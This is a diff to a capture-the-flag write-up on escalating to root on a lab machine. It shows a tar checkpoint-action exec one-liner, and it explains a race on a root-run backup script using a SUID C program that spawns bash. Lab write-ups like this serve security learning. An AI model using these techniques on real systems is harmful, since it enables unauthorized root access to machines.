@@ -237,10 +237,36 @@ sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exe
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/2b023d1f-6172-4a79-b4ae-586a6e56fde8)
 
 + And run: `./pspy32`
-+ It shows a script **/usr/sbin/backuperer** that runs as root every 5 minutes.
++ It shows a script **/usr/sbin/backuperer** and a scheduled task that runs as root every 5 minutes.
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/b0642ba4-bd97-4c02-b0ff-5a4176d6fe41)
 
++ Check **backuperer.timer** files.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/60a9fe10-19fc-4a52-b8e5-4f121de388a5)
+
++ In **backuperer** binary file, when the backup is being created, the script sleeps 30 seconds before it executes the rest of the commands. Use 30 seconds to replace the backup tar file that the script created with our own malicious file. After 30 seconds, it will create a directory called "check" and decompress our malicious backup tar file there. Then it will go through the integrity check and fail, thereby giving us 5 minutes before the next scheduled task is run, to escalate privileges. Once the 5 minutes are up, the backuperer program is run again and our files get deleted.
+
++ Create a **/var/www/html** directory in your current directory **/home/onuma**: `mkdir -p var/www/html`
++ Create your own compressed file **setuid.c** that contains a SUID executable to escalate privileges, and transfer it into **/home/onuma/var/www/html**
+```
+#include <unistd.h>
+int main()
+{
+    setuid(0);
+    execl("/bin/bash", "bash", (char *)NULL);
+    return 0;
+}
+```
+
++ Compile the program: `gcc -m32 -o setuid setuid.c`
++ If you have meet a problem in the below, run `sudo apt-get install gcc-multilib`
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/978f3a19-e39f-4815-bc2b-5677fbea21e7)
+
++ Try compile one more time again.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/c42190b6-ca36-424f-bd71-e58bfa37ebdc)
 
 
 
